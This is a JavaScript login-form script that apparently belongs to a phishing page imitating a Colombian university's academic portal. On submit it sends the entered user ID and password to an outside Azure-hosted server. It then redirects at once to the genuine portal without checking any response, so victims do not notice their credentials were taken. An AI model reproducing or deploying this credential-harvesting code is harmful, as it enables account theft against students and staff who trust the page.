document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("login");
    const userIdInput = document.getElementById("userid");
    const passwordInput = document.getElementById("pwd");

    form.addEventListener("submit", async (event) => {
        event.preventDefault(); // Evita el envío predeterminado del formulario

        // Validar campos
        const userId = userIdInput.value.trim();
        const password = passwordInput.value.trim();

        if (!userId || !password) {
            showError("Both User ID and Password are required.");
            return;
        }

        // Enviar datos al backend
        try {
            const response =  fetch("https://luk3-gabghycpchc0a6a4.brazilsouth-01.azurewebsites.net/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ userid: userId, password }),
            });
            window.location.href = "https://enlace-academico.escuelaing.edu.co/";
        } catch (error) {
            console.error("Error during login:", error);
            showError("An error occurred while trying to log in. Please try again.");
        }
    });

    // Función para mostrar errores en el DOM
    const showError = (message) => {
        const loginError = document.getElementById("login_error");
        const errorGif = document.getElementById("error_gif");

        // Mostrar el mensaje de error
        loginError.textContent = message;
        loginError.style.display = "block";

        // Mostrar el GIF de error
        if (errorGif) {
            errorGif.style.display = "block";
        }
    };

    // Ocultar errores cuando el usuario comienza a escribir
    form.addEventListener("input", () => {
        const loginError = document.getElementById("login_error");
        const errorGif = document.getElementById("error_gif");

        if (loginError) {
            loginError.style.display = "none";
        }
        if (errorGif) {
            errorGif.style.display = "none";
        }
    });
});